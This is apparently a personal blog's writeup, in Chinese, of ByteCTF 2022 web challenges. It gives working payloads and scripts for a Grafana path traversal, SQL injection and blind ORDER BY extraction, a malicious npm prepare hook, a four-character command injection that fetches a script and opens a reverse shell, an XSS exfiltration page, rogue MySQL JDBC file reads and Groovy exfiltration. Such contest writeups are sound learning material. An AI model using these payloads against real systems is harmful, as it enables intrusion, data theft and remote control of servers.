---
title: ByteCTF 2022 Web Writeup
date: 2022-09-26 19:20:00
updated: 2022-09-26 20:45:00
tags: [ctf, security]
description: ByteCTF2022 第9名 打的还不错的一场比赛
---

比赛时主要是做了ctf_cloud和typing_game两个题目，其中typing_game还是非预期解了，整体Web只差datamanager就AK了，不过`microservices`这道题目是学长们解出的，自己其实也没有去复现过。正好比赛结束还可以开靶机，可以抽空复现一下难题。

## easy_grafana

> You must have seen it, so you can hack it

之前也遇到过类似的题目，考的是grafana的CVE-2021-43798目录穿越漏洞。

需要注意的点是这里要加`/#/`才能成功读到文件。

可以从`/public/plugins/bargauge/#/../../../../../../../../../../../../../../etc/grafana/grafana.ini`获取secret_key `SW2YcwTIb9zpO1hoPsMm`
`/public/plugins/bargauge/#/../../../../../../../../../../../../../../var/lib/grafana/grafana.db`获取password `b0NXeVJoSXKPoSYIWt8i/GfPreRT03fO6gbMhzkPefodqe1nvGpdSROTvfHK1I3kzZy9SQnuVy9c3lVkvbyJcqRwNT6/`
这里mysql拿到了mysql的密码和key,用这个解密工具
<https://github.com/jas502n/Grafana-CVE-2021-43798>解出密码就是flag啦。

![图 1](https://s2.loli.net/2022/09/26/xLNkUDGsPvyQZKf.png)  

`ByteCTF{e292f461-285e-47fc-9210-b9cd233773cb}`

## ctf_cloud

> 改编自真实漏洞环境。在云计算日益发达的今天，许多云平台依靠其基础架构为用户提供云上开发功能，允许用户构建自己的应用，但这同样存在风险。

普通用户可以往package.json里面加信息，然后管理员才可以把这个加进去的依赖装上，首先应该是拿到管理员账号，然后再是加个有洞的依赖打RCE什么的。

/signup这个路由的password字段是拼接进去的，这里应该有注入点。

```js
router.post('/signup', function(req, res, next) {
    var username = req.body.username;
    var password = req.body.password;

    if (username == '' || password == '')
        return res.json({"code" : -1 , "message" : "Please input username and password."});

    // check if username exists
    db.get("SELECT * FROM users WHERE NAME = ?", [username], function(err, row) {
        if (err) {
            console.log(err);
            return res.json({"code" : -1, "message" : "Error executing SQL query"});
        }
        if (row) {
            console.log(row)
            return res.json({"code" : -1 , "message" : "Username already exists"});
        } else {
            // in case of sql injection , I'll reset admin's password to a new random string every time.
            var randomPassword = stringRandom(100);
            db.run(`UPDATE users SET PASSWORD = '${randomPassword}' WHERE NAME = 'admin'`, ()=>{});

            // insert new user
            var sql = `INSERT INTO users (NAME, PASSWORD, ACTIVE) VALUES (?, '${password}', 0)`;
            db.run(sql, [username], function(err) {
                if (err) {
                    console.log(err);
                    return res.json({"code" : -1, "message" : "Error executing SQL query " + sql});
                }
                return res.json({"code" : 0, "message" : "Sign up successful"});
            });
        }
    });
});
```

这里每次signup都会先重置管理员password然后执行sql语句。考虑利用堆叠注入修改管理员密码，然后直接登,但是设注册时的password参数为', 0);UPDATE users SET PASSWORD = '123' WHERE NAME = 'admin';# 但是这个函数不支持执行多条sql。

发现可以插入多行，数据表没约束用户名唯一，sqlite 的 CONFLICT 不能用。

```
ek1ng', 0), ('admin', 'ek1ng', 1);--- 
```

拿到管理员权限后，可以通过npm包的prepare属性打rce了。

1. 点重置删除 package.json 和 node_modules
2. 上传 package.json

```python
import requests


def uploadFile(url, file, filename="", contentType="text/plain"):
    if filename == "":
        filename = os.path.basename(file)
    fp = open(file, "rb")
    data = {
        "file": (filename, fp, contentType)
    }
    headers = {
        "Cookie": "connect.sid=s%3AXtdzlDJSttltRleoO5VRaqnoQzLLD2HY.14%2Be48yUMyRQgjtK2nDpYdrvrekCAwMViWMbBc7h0IU"
    }
    res = requests.post(url, files=data, headers=headers)
    fp.close()
    return res


res = uploadFile("https://eea8061294ea1d51ca4df400f54e3413.2022.capturetheflag.fun/dashboard/upload",
                 "./pkg/package.json", "package.json")
print(res.status_code, res.text)
```

```json
{
  "name": "pkg",
  "version": "1.0.0",
  "description": "",
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1",
    "prepare": "cat /flag / > /usr/local/app/public/c.txt"
  },
  "keywords": [],
  "author": "",
  "license": "ISC"
}
```

3. 设置 dependencies

POST的参数

```json
{"dependencies":{"pkg": "file:./public/uploads"}}
```

4. 编译
5. 访问 /c.txt 查看内容

因为这里不出网所以只能往网站目录下面写来访问。

`ByteCTF{c98ecaae-4e6e-43da-a084-1f0d99034420}`

## typing_game

> 我是练习时长两年半的nodejs菜鸟，欢迎来玩我写的小游戏

### 四字符命令注入弹Shell

这个题目当时出的队伍不多只有11个，不过我的做法是非预期的，用的是四字符命令注入弹shell。

通过`/report?url=<http://127.0.0.1:13002/status?cmd=ls`可以访问到/status接口并且执行4字符的命令。exp编写参考[HitconCTF2017 BabyFirst Revenge v2的exp](https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge-v2)。

这里需要注意的是必须先`rm *`，因为`*>v`这个命令默认的顺序是按照文件名称的，那么如果没有删掉`index.js`这个文件，会导致reverse file "v" to file "x"之后，x文件里面的内容是`ls index.js -th`,这就很尴尬了。

在服务器python3 -m http.server 8888起一个server并且放一个内容为sh -i >& /dev/tcp/xx.xxx.xxx.xxx/7777 0>&1,开启端口监听弹等shell弹过来就行。

```python
# encoding:utf-8
import requests
from time import sleep
baseurl = "https://e24f9597c9ab115b5116321ffbece014.2022.capturetheflag.fun/report?url=http://localhost:13002/status?cmd="

s = requests.session()

# 将ls -th 写入文件g
list = [
    'rm *',
    # generate "g> ht- sl" to file "v"
    '>dir',
    '>sl',
    '>g\>',
    '>ht-',
    '*>v',
    # reverse file "v" to file "x", content "ls -th >g"
    '>rev',
    '*v>x',
]
# curl xx.xxx.xxx.xxx:8888|bash
list2 = [
    ">sh",
    ">ba\\",
    ">\|\\",
    ">8\\",
    ">88\\",
    ">:8\\",
    ">xx\\",
    ">x\\",
    ">x.\\",
    ">xx\\",
    ">x.\\",
    ">xx\\",
    ">x.\\",
    ">x\\",
    ">\ \\",
    ">rl\\",
    ">cu\\",
]
for i in list:
    url = baseurl+str(i)
    res = s.get(url)
    print(res.text)
    sleep(35)
for j in list2:
    url = baseurl+str(j)
    res = s.get(url)
    print(res.text)
    sleep(35)
s.get(baseurl+"sh x")
sleep(35)
s.get(baseurl+"sh g")
```

最后在在环境变量中找到flag。

![图 2](https://s2.loli.net/2022/09/26/WBm5zSsNua3ifo2.png)  

可能也许这也是出题人预期的一种吧不然为啥是四字符呢，假如改成3字符唯一的做法就是xss带出回显然后执行`env`拿到flag了，不过这好像没有特别大的意义吧。

### CSS Leak通关游戏+ XSS带出命令执行回显

审计js代码，发现游戏结束的页面有XSS点，将用户传入的参数name通过innerHTML渲染在页面上。

![图 1](https://s2.loli.net/2022/09/27/NozKAZ584FGY9wu.png)  

传入参数`<img src=1 onerror=alert(1)>`,能够成功弹窗，也就是说我们如果构造一个恶意html页面放在服务器上，提交url让puppter访问，我们就可以执行任意js代码了，那么我们也就可以让puppter去访问status来执行命令，并且将访问结果附在url上请求我们的服务器，就能够将命令执行的结果回显。

![图 2](https://s2.loli.net/2022/09/27/qgF7bV4iRCIvHte.png)  

但是xss点在单词游戏结束的位置，而虽然我们本地可以修改js来看到，但是对于puppeteer来说还是需要先让它把游戏玩通关的。

```js
addEventListener("hashchange",e=>{
    typing(location.hash.replace("#","").split["?"](0))
})
```

注意到`game.js`中有`hashchange`事件，也就是`url#vidar`那么就会相当于typing`vidar`单词进去，因此可以通过url中hash值来通关游戏，通过`iframe`的`contentWindow.location.replace`进行hash值的输入，当完成单词游戏时，name参数通过innerHTML传入${username},执行javascript代码通过本地请求/status接口并且将结果拼接在路径里面，请求到自己的服务器上带出回显。

参考了nu1l的wp进行的复现

```html
<!DOCTYPE html>

<head>
</head>

<body>
    <iframe width="100%" height="500px" id="iframe" src="http://127.0.0.1:13002/"></iframe>
    <script>
        cmd = "env"
        cmd = `fetch("http://127.0.0.1:13002/status?cmd=${cmd}").then(x=>x.text()).then(x=>fetch("http://xxx.xxx.xxx.xxx?data="+x))`
        cmd = btoa(cmd)
        url = "http://127.0.0.1:13002/?name=%3Cimg%20src%3Dx%20onerror%3D'eval(atob(%22"+cmd+"%22))')%3E"
        const words =
            ['web', 'bytedance', 'ctf', 'sing', 'jump', 'rap', 'basketball', 'hello', 'world', 'fighting', 'flag', 'game', 'happy']
        i = 0
        l = 0
        iframe.onload = function () {
            const w = iframe.contentWindow
            w.location.replace(url + "#" + words[i]);
            if (i == 12) {
                i = 0;
                if (l++ > 13) {
                    fetch('/?done')
                    iframe.onload = function () { }
                }
            } else {
                i++;
            }
        }
    </script>
</body>
```

这里还有一个另外的方法，可以不需要用循环遍历来猜单词，而是可以知道随机到的`RandomWord`是什么。

在css里接收`color`参数，这里可以进行CSS注入，通过CSS注入来将`RandomWord`带出，再改变hash值输入，来达到预测的效果，假设这里使用随机字符串的话就必须用CSS注入这个做法啦。

CSS注入可以参考文件`<https://book.hacktricks.xyz/pentesting-web/xs-search/css-injection>`

![图 1](https://s2.loli.net/2022/09/28/9EIgxCoPdep3bfw.png)  

## microservice

> Hackers stole part of the source code of a microservice that was still in development

## datamanager

> make database great again

在`/dashboard?id=`这个参数有sql注入，`/dashboard?order=9`不会500而`/dashboard?order=10`会500,那么到此我们就可以猜测sql语句为`select xxx from xxx order by ${id}`。

不过经过Fuzz,题目过滤了很多关键词。

```
union ascii substr hex sleep benchmark mid left right = , ' " > < ; 
```

上面这些关键词都被过滤了。这里可以拼接`and case when then`的sql语句来进行order by注入。order by注入可以参考文章`https://www.secpulse.com/archives/57197.html`。

我是学习了W&M的exp进行的复现，发现原来可以用`string.printable[]`来表示可见字符。

`order=id and case when (database() like PAYLOAD) then 1 else 9223372036854775807%2B1 end`例如这条payload,在对应位置便利可见字符的16进制来模糊匹配，如果when条件为true那么按id排序正常200返回，否则会执行`9223372036854775807%+1`报错而500。

```python
from sre_constants import SUCCESS
import requests
requests = requests.Session()
import string

proxies = {}
import warnings
warnings.filterwarnings("ignore")

headers = {
    "Cookie": "__t_id=7267900aaba9b607c88b9639ae26899a; JSESSIONID=C1032349BC4000AE184AD31889B5B0F3",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"

}

#database() == datamanager
url = "<https://b9cf435899298a5ccde1a16acc13260e.2022.capturetheflag.fun/dashboard?order=id> and case when (database() like PAYLOAD) then 1 else 9223372036854775807%2B1 end"

#tables : source,users
url = "<https://b9cf435899298a5ccde1a16acc13260e.2022.capturetheflag.fun/dashboard?order=id> and case when ((select group_concat(table_name) from information_schema.tables where table_schema like 0x646174616d616e61676572) like PAYLOAD) then 1 else 9223372036854775807%2B1 end"

#columns from users: current\\_connections,total\\_connections,user,id,n4me,pas$word
url = "<https://b9cf435899298a5ccde1a16acc13260e.2022.capturetheflag.fun/dashboard?order=id> and case when ((select group_concat(column_name) from information_schema.columns where table_name like 0x7573657273) like PAYLOAD) then 1 else 9223372036854775807%2B1 end"

#n4me from users: ctf,...
url = "<https://b9cf435899298a5ccde1a16acc13260e.2022.capturetheflag.fun/dashboard?order=id> and case when ((select group_concat(n4me) from users) like PAYLOAD) then 1 else 9223372036854775807%2B1 end"

#pas$word from users: ctf@BvteDaNceS3cRet,...
url = "<https://b9cf435899298a5ccde1a16acc13260e.2022.capturetheflag.fun/dashboard?order=id> and case when ((select group_concat(pas$word) from users) like PAYLOAD) then 1 else 9223372036854775807%2B1 end"

def main():
    flag = ""
    while 1:
        success = False
        for i in string.printable[:-6]:
            if i in "_%[]":
                i = "\\\\"+i
            payload = "0x"
            for item in flag:
                payload += "%02x" % ord(item)
            for item in i:
                payload += "%02x" % ord(item)
            payload += "25"
            #print(payload)
            r = requests.get(url.replace("PAYLOAD",payload),proxies=proxies,headers=headers,verify=False,timeout=3)
            #if "SORRY!" not in r.text:
            if r.status_code == 200:
                flag += i
                print(flag)
                success = True
                break
        if success:
            continue
        else:
            print("failed",flag)
            raise Exception("failed")

if __name__ == "__main__":
    main()
```

拿到账号密码`ctf/ctf@BvteDaNceS3cRet`后登陆。

发现可以控制JDBC的参数，因为接口传一个叫`url`的参数来连接数据库。这里可以利用仓库`<https://github.com/rmb122/rogue_mysql_server>`来构造恶意mysql server,从而实现任意文件读取，同时还可以使用`file://`协议来读取目录，从而找到flag。

配置文件

```
host: 0.0.0.0
port: 3306
# 监听的 IP 和端口.

version_string: "10.4.13-MariaDB-log"
# 客户端得到的服务端版本信息.

file_list: ["/etc/passwd", "C:/boot.ini"]
save_path: ./loot
# 需要读取的文件, 注意这个不意味着一次性读取列表中的所有文件 (很多客户端实现不支持这种操作).
# 而是客户端每执行一次语句, 按照列表中的顺序读取一个文件, 并保存到 `save_path` 文件夹中.

always_read: true
# 如果为 true, 那么不管客户端是否标记自己支持 LOAD DATA LOCAL, 都会尝试去读取文件, 否则会根据客户端的标记来决定是否读取, 避免客户端请求不同步.

from_database_name: true
# 如果为 true, 将会从客户端设定中的数据库名称中提取要读取的文件.
# 例如链接串为 `jdbc:mysql://localhost:3306/%2fetc%2fhosts?allowLoadLocalInfile=true`.
# 将会从客户端读取 `/etc/hosts` 而不会遵循 `file_list` 中的设置.

max_file_size: 0
# 读取文件的最大大小 (单位 byte), 超过这个大小的文件内容将会被忽略. 如果 <= 0, 代表没有限制.

auth: false
users:
  - root: root
  - root: password
# 对应是否开启验证, 如果为 `false`, 那么不管输什么密码或者不输入密码都可以登录.
# 如果为 `true`, 则需要帐号密码匹配下面的设置的帐号密码中的一条.

jdbc_exploit: false
always_exploit: false
ysoserial_command:
  cc4: ["java", "-jar", "ysoserial-0.0.6-SNAPSHOT-all.jar", "CommonsCollections4", 'touch /tmp/cc4']
  cc7: ["java", "-jar", "ysoserial-0.0.6-SNAPSHOT-all.jar", "CommonsCollections7", 'touch /tmp/cc7']
# 见 `jdbc 利用相关` 一节
```

```
列 / 目录, url参数为`jdbc:mysql://vps:3306/file%3A%2F%2F%2F?allowLoadLocalInfile=true&allowUrlInLocalInfile=true`
```
![图 1](https://s2.loli.net/2022/09/29/rEapBNHgy5kOYAo.png) 

```
读Flag文件, url参数为`jdbc:mysql://vps:3306/file%3A%2F%2F%2Fvery_Str4nge_NamE_of_flag?allowLoadLocalInfile=true&allowUrlInLocalInfile=true`
```

![图 2](https://s2.loli.net/2022/09/29/mWULaI7zZHb6SGF.png)  


## easy_groovy

这是有点Web的一道题目，顺带也复现一下

groovy命令执行的题目，感觉还是有点不懂命令报错时annotation command的注解`annotation`是啥。

学习了W&M战队的wp,不过感觉是做法简单但是想不到这么去做。

```groovy
String fileContents = new File('/flag').text
new URL('http://vps/send?'+fileContents).getText()
```

## bash_game

> 2048

这个题目感觉很有趣，解出人数不多但是解法很多，所以顺带复现一下。

### ++创建变量trick绕过

第二次放出的附件中给出了cat /flag的条件

```bash
  if [[ "$score" -gt "$goal" ]] && [[ "$goal" -gt 99999999 ]]; then
      cat /flag
  fi
```

意思是`$score`要大于`$goal`并且`$goal`又要能大于`99999999`。
因为在bash中不存在的变量 ++ 会创建这一个变量 并且赋值为1，那么第一次运算时是`0 * 100000000`，第二次运算时是`1 * 10000000`就行。

输入`(vidar++*100000000)`，再让2048游戏结束就能拿到flag。

![图 2](https://s2.loli.net/2022/09/27/fd8bchAwouZq9zQ.png)  

### 数组内命令执行

通过`arr[$(cat /flag)]`这样的形式可以实现任意命令执行，因为bash会认为命令是数组索引，而先执行命令再解析，当然`cat /flag`的结果会报错，不过会输出到标准输出中，输入`vidar[$(cat /flag)]`，让2048游戏结束，拿到flag。

![图 1](https://s2.loli.net/2022/09/27/AGjKCw2MsbUqXWy.png)  

Misc其他题目都有点不想复现了，感觉意义不大，想专注于学Web。

最近感觉题目复现的多了打比赛也没那么坐牢了，基本上都是有思路也能做出，就是熟练度的一些问题吧，继续加油。
